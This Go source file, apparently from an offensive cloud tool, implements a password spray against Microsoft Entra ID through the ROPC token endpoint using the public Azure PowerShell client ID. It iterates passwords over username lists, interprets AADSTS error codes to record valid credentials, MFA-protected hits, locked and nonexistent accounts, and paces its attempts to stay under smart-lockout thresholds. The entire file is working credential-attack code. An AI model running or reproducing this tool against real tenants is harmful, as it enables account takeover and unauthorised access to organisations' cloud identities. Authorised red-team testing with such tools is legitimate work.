package spray

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/graphrunner/internal/output"
)

// SprayResult holds password spray results.
type SprayResult struct {
	TotalAttempts int           `json:"total_attempts"`
	Hits          []SprayHit    `json:"hits"`
	Locked        []string      `json:"locked_accounts"`
	Invalid       []string      `json:"invalid_users"`
	Errors        []string      `json:"errors,omitempty"`
}

// SprayHit represents a successful credential pair.
type SprayHit struct {
	Username string `json:"username"`
	Password string `json:"password"`
	TenantID string `json:"tenant_id,omitempty"`
}

const (
	tokenEndpoint = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
	// Azure PowerShell public client — no secret needed
	defaultClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
)

// PasswordSpray performs a password spray against a list of usernames.
// Uses ROPC (Resource Owner Password Credentials) flow.
// WARNING: Smart lockout triggers after ~10 bad attempts per user — use --delay.
func PasswordSpray(ctx context.Context, tenantID, clientID string, usernames []string, passwords []string, delaySec int) (*SprayResult, error) {
	if tenantID == "" {
		tenantID = "common"
	}
	if clientID == "" {
		clientID = defaultClientID
	}

	result := &SprayResult{}
	endpoint := fmt.Sprintf(tokenEndpoint, tenantID)

	output.Info("Starting password spray: %d users × %d passwords = %d attempts",
		len(usernames), len(passwords), len(usernames)*len(passwords))
	output.Warn("Smart lockout active — use --delay to avoid locking accounts")

	httpClient := &http.Client{Timeout: 15 * time.Second}

	for _, password := range passwords {
		output.Info("Spraying password: %q", password)

		for _, username := range usernames {
			// Check context cancellation
			select {
			case <-ctx.Done():
				output.Info("Spray cancelled.")
				return result, nil
			default:
			}

			result.TotalAttempts++

			_, errCode, err := tryCredential(httpClient, endpoint, clientID, username, password)
			if err != nil {
				output.Verbose("  %s — error: %v", username, err)
				result.Errors = append(result.Errors, fmt.Sprintf("%s: %v", username, err))
				continue
			}

			switch errCode {
			case "":
				// Success
				output.Success("  HIT: %s : %s", username, password)
				result.Hits = append(result.Hits, SprayHit{
					Username: username,
					Password: password,
					TenantID: tenantID,
				})
			case "AADSTS50126":
				// Invalid credentials — expected for spray
				output.Verbose("  %s — invalid credentials", username)
			case "AADSTS50053":
				// Account locked
				output.Warn("  LOCKED: %s", username)
				result.Locked = append(result.Locked, username)
			case "AADSTS50034":
				// User does not exist
				output.Verbose("  %s — user not found", username)
				result.Invalid = append(result.Invalid, username)
			case "AADSTS50057":
				// Account disabled
				output.Verbose("  %s — account disabled", username)
			case "AADSTS50076":
				// MFA required — credentials valid but MFA blocks
				output.Success("  VALID+MFA: %s : %s (MFA required)", username, password)
				result.Hits = append(result.Hits, SprayHit{
					Username: username,
					Password: password + " [MFA]",
					TenantID: tenantID,
				})
			case "AADSTS700016":
				// App not found in tenant
				return nil, fmt.Errorf("client ID %s not found in tenant — try --client-id", clientID)
			default:
				output.Verbose("  %s — %s", username, errCode)
			}

			if delaySec > 0 {
				select {
				case <-ctx.Done():
					return result, nil
				case <-time.After(time.Duration(delaySec) * time.Second):
				}
			}
		}

		// Inter-password delay (longer, to reset lockout window)
		if delaySec > 0 && len(passwords) > 1 {
			select {
			case <-ctx.Done():
				return result, nil
			case <-time.After(time.Duration(delaySec*2) * time.Second):
			}
		}
	}

	output.Success("Spray complete: %d attempts | %d hits | %d locked | %d invalid",
		result.TotalAttempts, len(result.Hits), len(result.Locked), len(result.Invalid))
	return result, nil
}

// tryCredential attempts ROPC authentication and returns (success, errorCode, error).
// errorCode is the AADSTS code if auth failed, empty string on success.
func tryCredential(httpClient *http.Client, endpoint, clientID, username, password string) (bool, string, error) {
	data := url.Values{
		"grant_type": {"password"},
		"client_id":  {clientID},
		"username":   {username},
		"password":   {password},
		"scope":      {"https://graph.microsoft.com/.default"},
	}

	resp, err := httpClient.PostForm(endpoint, data)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, "", err
	}

	bodyStr := string(body)

	if resp.StatusCode == 200 {
		return true, "", nil
	}

	// Extract AADSTS error code
	if idx := strings.Index(bodyStr, "AADSTS"); idx >= 0 {
		code := bodyStr[idx:]
		if end := strings.IndexAny(code, ": ,\""); end > 0 {
			code = code[:end]
		}
		return false, code, nil
	}

	return false, fmt.Sprintf("HTTP %d", resp.StatusCode), nil
}
